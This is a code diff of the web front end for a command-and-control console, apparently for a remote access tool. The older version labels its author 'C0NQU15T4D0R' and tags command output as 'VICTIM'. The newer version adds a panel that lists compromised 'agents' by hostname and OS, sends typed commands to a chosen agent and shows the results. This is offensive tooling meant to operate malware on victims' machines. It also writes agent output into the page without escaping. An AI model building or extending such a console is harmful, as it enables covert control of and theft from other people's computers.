@@ -2,110 +2,209 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>C2 Lite</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C2 Terminal Interface</title>
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body {
-            background-color: #1a1a1a;
-            font-family: 'Courier New', Courier, monospace;
-            padding: 20px;
-            color: white;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
+
+        body {
+            background-color: #000000;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            display: grid;
+            grid-template-columns: 1fr 300px;
+            grid-template-rows: 1fr auto 40px;
+            gap: 15px;
+            height: calc(100vh - 40px);
+        }
+
         .terminal {
-            background-color: #000;
-            border: 1px solid #fff;
-            border-radius: 5px;
+            background: #001100;
+            border: 1px solid #00ff00;
             padding: 20px;
             overflow-y: auto;
-            max-height: 400px;
-            margin-bottom: 20px;
-            font-size: 14px;
-            white-space: pre-wrap; /* Ensures proper formatting */
         }
-        .cmd-prompt {
-            color: #4CAF50;
-            font-weight: bold;
+
+        .agents-panel {
+            background: #000d00;
+            border: 1px solid #00ff00;
+            padding: 15px;
         }
-        .cmd-output {
-            color: #FFA500;
-            margin-bottom: 10px;
+
+        .command-box {
+            grid-column: 1 / -1;
+            display: flex;
+            gap: 10px;
+            background: #001100;
+            border: 1px solid #00ff00;
+            padding: 5px;
         }
-        .form-control {
-            background-color: #333;
-            color: #fff;
-            border: 1px solid #fff;
-            padding: 10px;
-            width: 100%;
+
+        input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            padding: 8px;
             outline: none;
         }
-        .btn-primary {
-            background-color: #007bff;
-            color: #fff;
-            border: none;
-            padding: 10px 20px;
+
+        button {
+            background: #002200;
+            color: #00ff00;
+            border: 1px solid #00ff00;
+            padding: 8px 15px;
             cursor: pointer;
+            font-family: 'Courier New', monospace;
+        }
+
+        button:hover {
+            background: #003300;
+        }
+
+        .agent-list {
+            list-style: none;
             margin-top: 10px;
+        }
+
+        .agent-item {
+            padding: 8px;
+            cursor: pointer;
+            border-bottom: 1px solid #004400;
+        }
+
+        .agent-item:hover {
+            background: #002200;
+        }
+
+        .cmd-prompt {
+            color: #00ff00;
+            margin-bottom: 5px;
+        }
+
+        .cmd-output {
+            color: #009900;
+            margin-bottom: 15px;
+            white-space: pre-wrap;
+        }
+
+        .system-info {
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px solid #004400;
         }
     </style>
 </head>
 <body>
-    <div class="container mx-auto">
-        <h1 class="text-white text-center text-4xl font-bold mt-8">C2 Lite</h1>
-        <p class="text-white text-center mb-8">by C0NQU15T4D0R</p>
+    <div class="container">
+        <div class="terminal" id="terminal">
+            <div class="cmd-output">C2 Channel initialized. Waiting for agents...</div>
+        </div>
 
-        <!-- Terminal Output -->
-        <div id="terminal" class="terminal"></div>
+        <div class="agents-panel">
+            <h2>ACTIVE AGENTS</h2>
+            <ul class="agent-list" id="agentList"></ul>
+            <div class="system-info" id="agentDetails">
+                <h3>SELECTED AGENT</h3>
+                <pre id="details">No agent selected</pre>
+            </div>
+        </div>
 
-        <!-- Command Input Form -->
-        <form id="messageForm">
-            <input type="text" class="form-control" id="messageInput" placeholder="Enter command...">
-            <button type="submit" class="btn btn-primary">Submit</button>
-        </form>
+        <div class="command-box">
+            <input type="text" id="messageInput" placeholder="Enter command...">
+            <button id="sendCommand">EXECUTE</button>
+        </div>
     </div>
 
     <script>
-        function refreshTerminal() {
+        let selectedAgent = null;
+
+        function fetchAgents() {
             $.ajax({
-                url: '/history',
-                type: 'GET',
-                dataType: 'json',
+                url: "/agents",
+                type: "GET",
                 success: function(data) {
-                    var terminalContent = "";
-
-                    data.forEach(entry => {
-                        if (entry["command"] === "clear_terminal_now") {
-                            terminalContent = ""; // Clear terminal on special command
-                        } else {
-                            terminalContent += `<div class="cmd-prompt">C0NQU15T4D0R$~ ${entry["command"]}</div>`;
-                            terminalContent += `<div class="cmd-output"><pre>VICTIM$~ ${entry["output"]}</pre></div>`;
-                        }
+                    $("#agentList").empty();
+                    data.forEach(agent => {
+                        $(`<li class="agent-item" onclick="selectAgent(${agent.id})">
+                            ${agent.hostname} [${agent.id}]
+                        </li>`).appendTo("#agentList");
                     });
+                }
+            });
+        }
 
-                    $("#terminal").html(terminalContent);
-                    $("#terminal").scrollTop($("#terminal")[0].scrollHeight); // Auto-scroll to latest output
+        function selectAgent(agentId) {
+            selectedAgent = agentId;
+            $.ajax({
+                url: `/agent/${agentId}`,
+                type: "GET",
+                success: function(data) {
+                    $("#details").html(
+                        `Hostname: ${data.hostname}\n` +
+                        `Agent ID: ${data.id}\n` +
+                        `OS: ${data.os}`
+                    );
+                    refreshTerminal();
+                }
+            });
+        }
+
+        function refreshTerminal() {
+            if (!selectedAgent) return;
+            
+            $.ajax({
+                url: `/history?agent_id=${selectedAgent}`,
+                type: "GET",
+                success: function(data) {
+                    $("#terminal").empty();
+                    data.forEach(entry => {
+                        $(`<div class="cmd-prompt">$ ${entry.command}</div>`).appendTo("#terminal");
+                        $(`<div class="cmd-output">${entry.output}</div>`).appendTo("#terminal");
+                    });
+                    $("#terminal").scrollTop($("#terminal")[0].scrollHeight);
                 }
             });
         }
 
         $(document).ready(function() {
-            refreshTerminal();
-            setInterval(refreshTerminal, 5000);
+            fetchAgents();
+            setInterval(fetchAgents, 3000);
+            setInterval(refreshTerminal, 3000);
 
-            $('#messageForm').submit(function(event) {
-                event.preventDefault();
-                var message = $('#messageInput').val().trim();
-                if (message === '') return;
+            $("#sendCommand").click(function() {
+                const command = $("#messageInput").val().trim();
+                if (!command || !selectedAgent) return;
 
                 $.ajax({
-                    url: '/submit',
-                    type: 'POST',
-                    contentType: 'application/json',
-                    data: JSON.stringify({ message: message }),
-                    success: function(response) {
-                        $('#messageInput').val('');
+                    url: "/submit",
+                    type: "POST",
+                    contentType: "application/json",
+                    data: JSON.stringify({
+                        agent: selectedAgent,
+                        message: command
+                    }),
+                    success: function() {
+                        $("#messageInput").val("");
                     }
                 });
+            });
+
+            $("#messageInput").keypress(function(e) {
+                if (e.which === 13) { // Enter key
+                    $("#sendCommand").click();
+                }
             });
         });
     </script>
